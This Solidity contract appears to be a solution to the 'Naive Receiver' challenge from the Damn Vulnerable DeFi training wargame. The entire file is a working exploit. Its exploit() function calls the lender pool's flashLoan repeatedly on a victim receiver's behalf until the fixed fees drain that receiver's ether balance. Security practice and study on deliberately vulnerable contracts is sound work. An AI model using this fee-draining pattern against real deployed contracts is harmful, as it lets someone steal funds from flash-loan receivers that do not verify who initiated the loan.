// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

/**
 * @title AttackerFlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackerFlashLoanReceiver {
    // using Address for address payable;

    address private immutable owner;
    address payable private pool;

    constructor(address payable poolAddress) {
        owner = msg.sender;
        pool = poolAddress;
    }

    modifier onlyAttacker {
        require(msg.sender == owner, "Only owner can use this contract");
        _;
    }

    function exploit(address borrower, uint256 borrowAmount) external onlyAttacker {
        // This code snippet is not necessarily gas efficient, since these values can be calculated off-chain
        uint256 victimBalance = borrower.balance;
        uint256 fee = NaiveReceiverLenderPool(pool).fixedFee();
        uint256 loop = SafeMath.div(victimBalance, fee);

        // Drain FlashLoanReceiver (borrrower)
        for(uint i = 0; i < loop; i++){
            NaiveReceiverLenderPool(pool).flashLoan(
                borrower, 
                borrowAmount
            );
        }
    }
}